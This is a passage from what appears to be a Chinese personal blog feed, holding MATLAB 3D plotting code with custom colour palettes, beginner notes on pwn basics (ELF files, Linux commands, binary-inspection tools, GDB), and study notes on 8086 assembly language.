<span class="number">1</span>:<span class="built_in">length</span>(h)</span><br><span class="line">    colorIndex = <span class="built_in">mod</span>(s<span class="number">-1</span>, <span class="built_in">size</span>(colorRGB,<span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    set(h(s),...</span><br><span class="line">        <span class="string">&#x27;FaceColor&#x27;</span>, colorRGB(colorIndex,:),... <span class="comment">% 填充色</span></span><br><span class="line">        <span class="string">&#x27;EdgeColor&#x27;</span>, [<span class="number">0</span> <span class="number">0</span> <span class="number">0</span>],...      <span class="comment">% 保持黑色边框</span></span><br><span class="line">        <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">0.8</span>,...          <span class="comment">% 边框线宽</span></span><br><span class="line">        <span class="string">&#x27;FaceAlpha&#x27;</span>, <span class="number">1</span>,...            <span class="comment">% 去除透明度</span></span><br><span class="line">        <span class="string">&#x27;CDataMapping&#x27;</span>,<span class="string">&#x27;direct&#x27;</span>);     <span class="comment">% 禁用颜色渐变</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 坐标轴设置</span></span><br><span class="line">set(gca,...</span><br><span class="line">    <span class="string">&#x27;Projection&#x27;</span>,<span class="string">&#x27;orthographic&#x27;</span>,...   <span class="comment">% 正交投影（平面化效果）</span></span><br><span class="line">    <span class="string">&#x27;AmbientLightColor&#x27;</span>,[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>],...   <span class="comment">% 纯白环境光</span></span><br><span class="line">    <span class="string">&#x27;GridLineStyle&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,...           <span class="comment">% 实线网格</span></span><br><span class="line">    <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">0.8</span>,...</span><br><span class="line">    <span class="string">&#x27;FontSize&#x27;</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 禁用所有光照效果</span></span><br><span class="line">lighting none</span><br><span class="line">material([<span class="number">0.9</span> <span class="number">0.1</span> <span class="number">0</span>])                <span class="comment">% 最小化材质反射</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 标签系统</span></span><br><span class="line">xlabel(<span class="string">&#x27;Categories&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">11</span>)</span><br><span class="line">ylabel(<span class="string">&#x27;Series&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">11</span>)</span><br><span class="line">zlabel(<span class="string">&#x27;Values&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 视角设置</span></span><br><span class="line">view(<span class="number">-40</span>, <span class="number">30</span>) <span class="comment">% 标准观察角度</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://p.sda1.dev/22/d8f290e69d30ff2ce8ff178415d02dfd/1.png" /></p>
<h1 id="三维折线图">2.三维折线图</h1>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">#<span class="number">2878b5</span> #9ac9db #f8ac8c #c82423 #ff8884</span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%% 颜色配置（使用指定HEX颜色）</span></span><br><span class="line">colorHex = &#123;<span class="string">&#x27;#2878b5&#x27;</span>, <span class="string">&#x27;#9ac9db&#x27;</span>, <span class="string">&#x27;#f8ac8c&#x27;</span>&#125;; <span class="comment">% 选择前三种颜色对应三个信号</span></span><br><span class="line">colorRGB = <span class="built_in">zeros</span>(<span class="built_in">length</span>(colorHex),<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span> k = <span class="number">1</span>:<span class="built_in">length</span>(colorHex)</span><br><span class="line">    hex = colorHex&#123;k&#125;(<span class="number">2</span>:<span class="keyword">end</span>);</span><br><span class="line">    colorRGB(k,:) = [hex2dec(hex(<span class="number">1</span>:<span class="number">2</span>)), hex2dec(hex(<span class="number">3</span>:<span class="number">4</span>)), hex2dec(hex(<span class="number">5</span>:<span class="number">6</span>))]/<span class="number">255</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%% 生成三个信号（保持原数据生成逻辑）</span></span><br><span class="line">t = <span class="number">0</span>:<span class="number">0.001</span>:<span class="number">1</span>;</span><br><span class="line">s1 = <span class="built_in">sin</span>(<span class="number">2</span>*<span class="built_in">pi</span>*<span class="number">10</span>*t);</span><br><span class="line">s2 = <span class="built_in">sin</span>(<span class="number">2</span>*<span class="built_in">pi</span>*<span class="number">10</span>*t) + <span class="number">0.5</span>*<span class="built_in">sin</span>(<span class="number">2</span>*<span class="built_in">pi</span>*<span class="number">20</span>*t);</span><br><span class="line">s3 = <span class="number">0.7</span>*<span class="built_in">sin</span>(<span class="number">2</span>*<span class="built_in">pi</span>*<span class="number">15</span>*t);</span><br><span class="line">z1 = s1 + <span class="number">0.5</span>*<span class="built_in">randn</span>(<span class="built_in">size</span>(t));</span><br><span class="line">z2 = s2 + <span class="number">0.3</span>*<span class="built_in">rand</span>(<span class="built_in">size</span>(t));</span><br><span class="line">z3 = s3 + <span class="number">0.2</span>*<span class="built_in">randn</span>(<span class="built_in">size</span>(t));</span><br><span class="line"></span><br><span class="line"><span class="comment">% 生成y轴位置矩阵</span></span><br><span class="line">yPositions = [<span class="number">0</span>; <span class="number">1</span>; <span class="number">2</span>]; <span class="comment">% 三维视图的y坐标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%% 专业可视化设置</span></span><br><span class="line"><span class="built_in">figure</span>(<span class="string">&#x27;Color&#x27;</span>,[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>], <span class="string">&#x27;Position&#x27;</span>, [<span class="number">100</span> <span class="number">100</span> <span class="number">1200</span> <span class="number">800</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">% ================= 三维视图子图 =================</span></span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">hold</span> on</span><br><span class="line"></span><br><span class="line"><span class="comment">% 绘制三维信号线（增强样式）</span></span><br><span class="line"><span class="built_in">plot3</span>(t, yPositions(<span class="number">1</span>)*<span class="built_in">ones</span>(<span class="built_in">size</span>(t)), z1,...</span><br><span class="line">    <span class="string">&#x27;Color&#x27;</span>, colorRGB(<span class="number">1</span>,:), <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">1.8</span>)</span><br><span class="line"><span class="built_in">plot3</span>(t, yPositions(<span class="number">2</span>)*<span class="built_in">ones</span>(<span class="built_in">size</span>(t)), z2,...</span><br><span class="line">    <span class="string">&#x27;Color&#x27;</span>, colorRGB(<span class="number">2</span>,:), <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">1.8</span>)</span><br><span class="line"><span class="built_in">plot3</span>(t, yPositions(<span class="number">3</span>)*<span class="built_in">ones</span>(<span class="built_in">size</span>(t)), z3,...</span><br><span class="line">    <span class="string">&#x27;Color&#x27;</span>, colorRGB(<span class="number">3</span>,:), <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">1.8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">hold</span> off</span><br><span class="line"></span><br><span class="line"><span class="comment">% 三维视图美化</span></span><br><span class="line">set(gca, <span class="string">&#x27;FontName&#x27;</span>,<span class="string">&#x27;Arial&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">11</span>,...</span><br><span class="line">         <span class="string">&#x27;XColor&#x27;</span>,[<span class="number">0.3</span> <span class="number">0.3</span> <span class="number">0.3</span>], <span class="string">&#x27;YColor&#x27;</span>,[<span class="number">0.3</span> <span class="number">0.3</span> <span class="number">0.3</span>], <span class="string">&#x27;ZColor&#x27;</span>,[<span class="number">0.3</span> <span class="number">0.3</span> <span class="number">0.3</span>],...</span><br><span class="line">         <span class="string">&#x27;GridColor&#x27;</span>,[<span class="number">0.85</span> <span class="number">0.85</span> <span class="number">0.85</span>], <span class="string">&#x27;LineWidth&#x27;</span>,<span class="number">1.2</span>)</span><br><span class="line">view(<span class="number">-25</span>, <span class="number">45</span>) <span class="comment">% 最佳观察角度</span></span><br><span class="line">title(<span class="string">&#x27;三维信号视图&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">13</span>, <span class="string">&#x27;FontWeight&#x27;</span>,<span class="string">&#x27;bold&#x27;</span>)</span><br><span class="line">zlabel(<span class="string">&#x27;幅值 (mV)&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">12</span>, <span class="string">&#x27;Rotation&#x27;</span>,<span class="number">0</span>, <span class="string">&#x27;VerticalAlignment&#x27;</span>,<span class="string">&#x27;middle&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% ================= 二维视图子图 =================</span></span><br><span class="line">subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="built_in">hold</span> on</span><br><span class="line"></span><br><span class="line"><span class="comment">% 绘制二维信号线（同步颜色方案）</span></span><br><span class="line"><span class="built_in">plot</span>(t, z1, <span class="string">&#x27;Color&#x27;</span>, colorRGB(<span class="number">1</span>,:), <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">1.5</span>)</span><br><span class="line"><span class="built_in">plot</span>(t, z2, <span class="string">&#x27;Color&#x27;</span>, colorRGB(<span class="number">2</span>,:), <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">1.5</span>)</span><br><span class="line"><span class="built_in">plot</span>(t, z3, <span class="string">&#x27;Color&#x27;</span>, colorRGB(<span class="number">3</span>,:), <span class="string">&#x27;LineWidth&#x27;</span>, <span class="number">1.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">hold</span> off</span><br><span class="line"></span><br><span class="line"><span class="comment">% 二维视图美化</span></span><br><span class="line">set(gca, <span class="string">&#x27;FontName&#x27;</span>,<span class="string">&#x27;Arial&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">11</span>,...</span><br><span class="line">         <span class="string">&#x27;XColor&#x27;</span>,[<span class="number">0.3</span> <span class="number">0.3</span> <span class="number">0.3</span>], <span class="string">&#x27;YColor&#x27;</span>,[<span class="number">0.3</span> <span class="number">0.3</span> <span class="number">0.3</span>],...</span><br><span class="line">         <span class="string">&#x27;GridColor&#x27;</span>,[<span class="number">0.9</span> <span class="number">0.9</span> <span class="number">0.9</span>], <span class="string">&#x27;LineWidth&#x27;</span>,<span class="number">1.2</span>)</span><br><span class="line">xlabel(<span class="string">&#x27;时间 (s)&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">12</span>)</span><br><span class="line">ylabel(<span class="string">&#x27;幅值 (mV)&#x27;</span>, <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">12</span>)</span><br><span class="line"><span class="built_in">legend</span>(&#123;<span class="string">&#x27;信号1&#x27;</span>, <span class="string">&#x27;信号2&#x27;</span>, <span class="string">&#x27;信号3&#x27;</span>&#125;,...</span><br><span class="line">       <span class="string">&#x27;Location&#x27;</span>,<span class="string">&#x27;northeast&#x27;</span>,...</span><br><span class="line">       <span class="string">&#x27;FontSize&#x27;</span>,<span class="number">10</span>,...</span><br><span class="line">       <span class="string">&#x27;NumColumns&#x27;</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">%% 全局设置</span></span><br><span class="line"><span class="comment">% 同步坐标轴范围</span></span><br><span class="line">linkprop([subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>), subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>)], <span class="string">&#x27;XLim&#x27;</span>); </span><br></pre></td></tr></table></figure>
<p><img
src="https://p.sda1.dev/22/eafa3eb5b10a84b267e76148d135d8e0/2.png" /></p>
<h1 id="三维曲面图">3.三维曲面图</h1>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">#F27970 #BB9727 #<span class="number">54B345</span> #<span class="number">32B897</span> #<span class="number">05B9E2</span> #8983BF #C76DA2</span><br></pre></td></tr></table></figure>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">%% 安全验证的曲面图代码</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">    <span class="comment">% ===== 颜色配置 =====</span></span><br><span class="line">    hexColors = &#123;<span class="string">&#x27;#F27970&#x27;</span>,<span class="string">&#x27;#BB9727&#x27;</span>,<span class="string">&#x27;#54B345&#x27;</span>,<span class="string">&#x27;#32B897&#x27;</span>,<span class="string">&#x27;#05B9E2&#x27;</span>,<span class="string">&#x27;#8983BF&#x27;</span>,<span class="string">&#x27;#C76DA2&#x27;</span>&#125;;</span><br><span class="line">    customMap = <span class="built_in">zeros</span>(<span class="built_in">length</span>(hexColors),<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% HEX转RGB（带错误检查）</span></span><br><span class="line">    <span class="keyword">for</span> k = <span class="number">1</span>:<span class="built_in">length</span>(hexColors)</span><br><span class="line">        assert(<span class="built_in">length</span>(hexColors&#123;k&#125;)==<span class="number">7</span>, <span class="string">&#x27;第%d个颜色代码格式错误&#x27;</span>, k);</span><br><span class="line">        hex = hexColors&#123;k&#125;(<span class="number">2</span>:<span class="keyword">end</span>);</span><br><span class="line">        customMap(k,:) = [hex2dec(hex(<span class="number">1</span>:<span class="number">2</span>)), hex2dec(hex(<span class="number">3</span>:<span class="number">4</span>)), hex2dec(hex(<span class="number">5</span>:<span class="number">6</span>))]/<span class="number">255</span>;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">% ===== 数据生成 =====</span></span><br><span class="line">    [X,Y] = <span class="built_in">meshgrid</span>(<span class="built_in">linspace</span>(<span class="number">-3</span>,<span class="number">3</span>,<span class="number">100</span>)); <span class="comment">% 100x100网格</span></span><br><span class="line">    Z = <span class="built_in">sin</span>(X).*<span class="built_in">cos</span>(Y) + <span class="number">0.5</span>*peaks(<span class="number">100</span>); <span class="comment">% 确保peaks尺寸匹配</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">% 维度验证</span></span><br><span class="line">    assert(<span class="built_in">isequal</span>(<span class="built_in">size</span>(X), <span class="built_in">size</span>(Y), <span class="built_in">size</span>(Z)),...</span><br><span class="line">        <span class="string">&#x27;数据维度不匹配 X:%s Y:%s Z:%s&#x27;</span>,...</span><br><span class="line">        mat2str(<span class="built_in">size</span>(X)), mat2str(<span class="built_in">size</span>(Y)), mat2str(<span class="built_in">size</span>(Z)))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% ===== 可视化 =====</span></span><br><span class="line">    <span class="built_in">figure</span>(<span class="string">&#x27;Color&#x27;</span>,[<span class="number">1</span> <span class="number">1</span> <span class="number">1</span>], <span class="string">&#x27;Position&#x27;</span>,[<span class="number">100</span> <span class="number">100</span> <span class="number">1000</span> <span class="number">800</span>])</span><br><span class="line">    surfObj = surf(X,Y,Z,<span class="string">&#x27;EdgeColor&#x27;</span>,<span class="string">&#x27;none&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% 颜色映射验证</span></span><br><span class="line">    colorSteps = <span class="number">256</span>;</span><br><span class="line">    x = <span class="built_in">linspace</span>(<span class="number">1</span>, <span class="built_in">size</span>(customMap,<span class="number">1</span>), colorSteps);</span><br><span class="line">    customColormap = interp1(<span class="number">1</span>:<span class="built_in">size</span>(customMap,<span class="number">1</span>), customMap, x, <span class="string">&#x27;linear&#x27;</span>);</span><br><span class="line">    assert(<span class="built_in">size</span>(customColormap,<span class="number">2</span>)==<span class="number">3</span>, <span class="string">&#x27;颜色矩阵格式错误&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    colormap(customColormap)</span><br><span class="line">    caxis([<span class="built_in">min</span>(Z(:)) <span class="built_in">max</span>(Z(:))]) </span><br><span class="line">    </span><br><span class="line">    <span class="comment">% ===== 图形美化 =====</span></span><br><span class="line">    material([<span class="number">0.3</span> <span class="number">0.7</span> <span class="number">0.2</span>])</span><br><span class="line">    light(<span class="string">&#x27;Position&#x27;</span>,[<span class="number">-1</span> <span class="number">0</span> <span class="number">1</span>],<span class="string">&#x27;Style&#x27;</span>,<span class="string">&#x27;infinite&#x27;</span>)</span><br><span class="line">    lighting gouraud</span><br><span class="line">    view(<span class="number">-35</span>, <span class="number">25</span>)</span><br><span class="line">    axis tight</span><br><span class="line">    </span><br><span class="line"><span class="keyword">catch</span> ME</span><br><span class="line">    <span class="comment">% 错误处理</span></span><br><span class="line">    <span class="built_in">disp</span>(<span class="string">&#x27;========= 调试信息 =========&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> exist(<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;var&#x27;</span>), fprintf(<span class="string">&#x27;X尺寸: %s\n&#x27;</span>, mat2str(<span class="built_in">size</span>(X))); <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> exist(<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;var&#x27;</span>), fprintf(<span class="string">&#x27;Y尺寸: %s\n&#x27;</span>, mat2str(<span class="built_in">size</span>(Y))); <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> exist(<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;var&#x27;</span>), fprintf(<span class="string">&#x27;Z尺寸: %s\n&#x27;</span>, mat2str(<span class="built_in">size</span>(Z))); <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> exist(<span class="string">&#x27;customColormap&#x27;</span>,<span class="string">&#x27;var&#x27;</span>), fprintf(<span class="string">&#x27;颜色矩阵尺寸: %s\n&#x27;</span>, mat2str(<span class="built_in">size</span>(customColormap))); <span class="keyword">end</span></span><br><span class="line">    rethrow(ME)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://p.sda1.dev/22/2d44f93240e87e98608e4b0f29506b74/3.png" /></p>
]]></content>
  </entry>
  <entry>
    <title>pwn之旅 （一）</title>
    <url>/2024/11/08/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="pwn之旅一">pwn之旅（一）</h1>
<h2 id="一elf文件以及前置知识">一、ELF文件以及前置知识</h2>
<h3 id="关键名词">1.关键名词</h3>
<p>exploit：用于攻击的脚本与方案</p>
<p>payload：攻击载荷，是目标进程被劫持控制流的数据</p>
<p>shellcode：调用攻击目标的shell的代码</p>
<p>elf文件：在Linux上编译的可执行文件（.out,.so,.a）</p>
<p>动态链接库：.so</p>
<p>静态链接库：.a</p>
<p>磁盘中才叫ELF，内存中叫映像，ELF有两个头（header），一个节（sections），第一个头包括整个结构信息，</p>
<h2 id="二linux基本操作">二、Linux基本操作</h2>
<p>1.cd：进入主目录</p>
<p>2.pwd：查看当前所在目录</p>
<p>3.ls：看当前目录的子目录</p>
<p>4，-a：查看子目录更详细的信息</p>
<p>5.touch：创建文件，用空格隔开可同时创建多个</p>
<p>6.cat：查看文件内容</p>
<p>7.rm 文件名：删除某文件</p>
<p>8.mkdir：创建新目录规则同touch</p>
<p>9.cp 文件名 目录名：复制文件至</p>
<p>10.mv：同上，移动</p>
<p>11.在10的基础上加上/文件名，可以进行重命名</p>
<p>12.man查看用法，q退出</p>
<p>13.chmod +r/w/x 文件名，修改可读可写可执行权限</p>
<p>14.执行用./</p>
<p>15.可以通过<code>readelf -h &lt;elf_name&gt;</code>
来查看头部信息</p>
<p>16.su 切换到超级用户</p>
<p>17.cd ..上一级目录</p>
<h2 id="三工具操作指令">三、工具操作指令</h2>
<h3 id="file-指令">1.file 指令</h3>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span> <span class="keyword">ts</span></span><br></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ts</span>: ELF <span class="number">64</span>-bit LSB pie executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, </span><br><span class="line"><span class="attribute">BuildID</span>[sha1]=<span class="number">93</span>f72a0d1b001212ba5860a6a1da7e57a36e3f47, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, not stripped</span><br></pre></td></tr></table></figure>
<h3 id="nm-指令">2.nm 指令</h3>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">nm</span> <span class="keyword">ts</span> </span><br></pre></td></tr></table></figure>
<h3 id="readelf-指令">3.readelf 指令</h3>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">readelf -<span class="selector-tag">a</span> ts</span><br></pre></td></tr></table></figure>
<h3 id="checksec">4.checksec</h3>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">checksec <span class="attribute">--file</span>=pwn1 </span><br></pre></td></tr></table></figure>
<h3 id="hexdump-指令">5.hexdump 指令</h3>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hexdump ts</span></span><br></pre></td></tr></table></figure>
<h3 id="strings-指令">6.strings 指令</h3>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span>s ts</span><br></pre></td></tr></table></figure>
<h3 id="objdump-指令">7.objdump 指令</h3>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">objdump -d ts</span></span><br></pre></td></tr></table></figure>
<h3 id="ldd-指令">8.ldd 指令</h3>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ldd</span> ts</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>pwn之旅 （二）</title>
    <url>/2024/11/16/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="pwn之旅二">pwn之旅（二）</h1>
<h2 id="一初识gdb">一、初识GDB</h2>
<p>1.设置断点 b（任意字母） *xxxxxxxx（地址）</p>
<p>i b（对应字母）步入</p>
<p>2.ni 单步</p>
<p>3.i r 观察寄存器的值</p>
<p>4.disassemble xxxxx（如$rip） 反编译</p>
<p>5.j（xx）汇编指令</p>
<figure>
<img src="pwn之旅-（二）.assets/jcc.png" alt="jcc" />
<figcaption aria-hidden="true">jcc</figcaption>
</figure>
]]></content>
  </entry>
  <entry>
    <title>汇编</title>
    <url>/2025/06/28/%E4%B8%80%E3%80%81%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h3 id="一汇编语言基础">一、<strong>汇编语言基础</strong></h3>
<ol type="1">
<li><strong>数制与编码</strong>
<ul>
<li><strong>进制转换</strong>：二进制、十六进制与十进制互转（重点掌握8421BCD码）16
<ul>
<li>例：<code>1011B = 11D</code>，<code>AF17H = 44823D</code></li>
</ul></li>
<li><strong>补码表示</strong>：负数补码=反码+1（用于有符号数运算）3</li>
<li><strong>ASCII码</strong>：<code>A=41H</code>，<code>回车=0DH</code>，<code>换行=0AH</code>36</li>
</ul></li>
<li><strong>基本概念</strong>
<ul>
<li>机器指令（二进制） vs 汇编指令（助记符） vs
伪指令（编译器指令）14</li>
<li><strong>三大总线</strong>：地址总线（寻址）、数据总线（传输）、控制总线（操作信号）1</li>
<li><strong>存储器类型</strong>：RAM（断电丢失） vs
ROM（永久存储）1</li>
</ul></li>
</ol>
<hr />
<h3 id="二80868088-cpu核心架构">二、<strong>8086/8088
CPU核心架构</strong></h3>
<ol type="1">
<li><p><strong>寄存器组</strong></p>
<ul>
<li><strong>通用寄存器</strong>：
<ul>
<li><code>AX</code>（累加器），<code>BX</code>（基址），<code>CX</code>（计数），<code>DX</code>（数据）</li>
<li><code>SI</code>（源变址），<code>DI</code>（目的变址），<code>BP</code>（基址指针），<code>SP</code>（堆栈指针）168</li>
</ul></li>
<li><strong>段寄存器</strong>：
<ul>
<li><code>CS</code>（代码段），<code>DS</code>（数据段），<code>SS</code>（堆栈段），<code>ES</code>（附加段）6</li>
</ul></li>
<li><strong>控制寄存器</strong>：
<ul>
<li><code>IP</code>（指令指针），<code>FLAGS</code>（标志寄存器）6</li>
</ul></li>
</ul></li>
<li><p><strong>物理地址计算</strong></p>
<ul>
<li><strong>公式</strong>：<code>物理地址 = 段地址 × 16 + 偏移地址</code>16
<ul>
<li>例：<code>236FH:1000H → 246F0H</code></li>
</ul></li>
<li><strong>段内最大范围</strong>：64KB（偏移地址16位）10</li>
</ul></li>
<li><p><strong>标志寄存器（FLAGS）</strong></p>
<table>
<thead>
<tr>
<th style="text-align: left;">标志位</th>
<th style="text-align: left;">含义</th>
<th style="text-align: left;">触发条件</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><code>ZF</code></td>
<td style="text-align: left;">零标志位</td>
<td style="text-align: left;">结果=0时置1</td>
<td></td>
</tr>
<tr>
<td style="text-align: left;"><code>CF</code></td>
<td style="text-align: left;">进位标志位</td>
<td style="text-align: left;">无符号数溢出时置1</td>
<td></td>
</tr>
<tr>
<td style="text-align: left;"><code>SF</code></td>
<td style="text-align: left;">符号标志位</td>
<td style="text-align: left;">结果为负时置1</td>
<td></td>
</tr>
<tr>
<td style="text-align: left;"><code>OF</code></td>
<td style="text-align: left;">溢出标志位</td>
<td style="text-align: left;">有符号数溢出时置1</td>
<td></td>
</tr>
<tr>
<td style="text-align: left;"><code>PF</code></td>
<td style="text-align: left;">奇偶标志位</td>
<td style="text-align: left;">结果低8位中1的个数为偶数时置1</td>
<td>18</td>
</tr>
</tbody>
</table></li>
</ol>
<hr />
<h3 id="三汇编指令系统详解">三、<strong>汇编指令系统详解</strong></h3>
<ol type="1">
<li><strong>数据传送指令</strong>
<ul>
<li><code>MOV</code>：双操作数字长需一致，禁止内存间直接传送68</li>
<li><code>XCHG</code>：交换数据（寄存器/内存）</li>
<li><code>PUSH/POP</code>：堆栈操作（<code>SS:SP</code>管理，高地址向低地址增长）6</li>
</ul></li>
<li><strong>算术运算指令</strong>
<ul>
<li><code>ADD/SUB</code>：影响<code>CF, ZF, SF, OF</code></li>
<li><code>MUL/DIV</code>：
<ul>
<li>字节乘法：<code>AL × 源 → AX</code></li>
<li>字除法：<code>DX:AX ÷ 源 → 商在AX，余数在DX</code>68</li>
</ul></li>
<li><code>INC/DEC</code>：不影响<code>CF</code></li>
</ul></li>
<li><strong>逻辑与移位指令</strong>
<ul>
<li><code>AND/OR/XOR</code>：位操作（例：大小写转换
<code>AND AL, 11011111B</code>）</li>
<li><code>SHL/SHR</code>：逻辑左移/右移（左移1位=×2，右移1位=÷2）</li>
<li><code>ROL/ROR</code>：循环移位8</li>
</ul></li>
<li><strong>程序控制指令</strong>
<ul>
<li><code>JMP</code>：无条件转移</li>
<li>条件跳转：
<ul>
<li>无符号数：<code>JA</code>（大于），<code>JB</code>（小于）</li>
<li>有符号数：<code>JG</code>（大于），<code>JL</code>（小于）</li>
</ul></li>
<li><code>LOOP</code>：循环指令（<code>CX</code>作为计数器）68</li>
</ul></li>
</ol>
<hr />
<h3 id="四寻址方式必考">四、<strong>寻址方式（必考）</strong></h3>
<ol type="1">
<li><strong>7种寻址方式</strong>
<ul>
<li>立即寻址：<code>MOV AX, 3064H</code></li>
<li>寄存器寻址：<code>MOV BX, AX</code></li>
<li>直接寻址：<code>MOV AX, [2000H]</code></li>
<li>寄存器间接：<code>MOV AX, [BX]</code></li>
<li>基址变址：<code>MOV AX, [BX+SI+2]</code>（有效地址=
<code>BX+SI+2</code>）410</li>
<li><strong>重点</strong>：基址寄存器（<code>BX/BP</code>）与变址寄存器（<code>SI/DI</code>）的组合规则1</li>
</ul></li>
</ol>
<hr />
<h3 id="五程序设计基础">五、<strong>程序设计基础</strong></h3>
<ol type="1">
<li><p><strong>伪指令与程序结构</strong></p>
<ul>
<li><p>数据定义：<code>DB</code>（字节），<code>DW</code>（字），<code>DD</code>（双字）</p>
<ul>
<li>例：<code>BUF DW 10 DUP(0)</code> → 分配20字节6</li>
</ul></li>
<li><p>段定义：</p>
<p>assembly</p>
<p>复制</p>
<p>下载</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">DATA <span class="meta">SEGMENT</span></span><br><span class="line">    VAR <span class="built_in">DB</span> <span class="number">25H</span></span><br><span class="line">DATA ENDS</span><br><span class="line">CODE <span class="meta">SEGMENT</span></span><br><span class="line">    <span class="meta">ASSUME</span> <span class="built_in">CS</span>:CODE, <span class="built_in">DS</span>:DATA</span><br><span class="line">    <span class="keyword">MOV</span> <span class="built_in">AX</span>, DATA</span><br><span class="line">    <span class="keyword">MOV</span> <span class="built_in">DS</span>, <span class="built_in">AX</span></span><br><span class="line">CODE ENDS</span><br></pre></td></tr></table></figure></li>
<li><p>程序结束：<code>MOV AH, 4CH</code> +
<code>INT 21H</code>67</p></li>
</ul></li>
<li><p><strong>流程控制结构</strong></p>
<ul>
<li><p><strong>分支</strong>：<code>CMP AX, BX</code> +
<code>JGE LABEL</code>（有符号数比较）</p></li>
<li><p><strong>循环</strong>：</p>
<p>assembly</p>
<p>复制</p>
<p>下载</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">CX</span>, <span class="number">10</span></span><br><span class="line"><span class="symbol">L1:</span> </span><br><span class="line">    <span class="comment">; 循环体</span></span><br><span class="line">    <span class="keyword">LOOP</span> L1</span><br></pre></td></tr></table></figure></li>
<li><p><strong>子程序</strong>：<code>CALL PROC_NAME</code> +
<code>RET</code>7</p></li>
</ul></li>
</ol>
<hr />
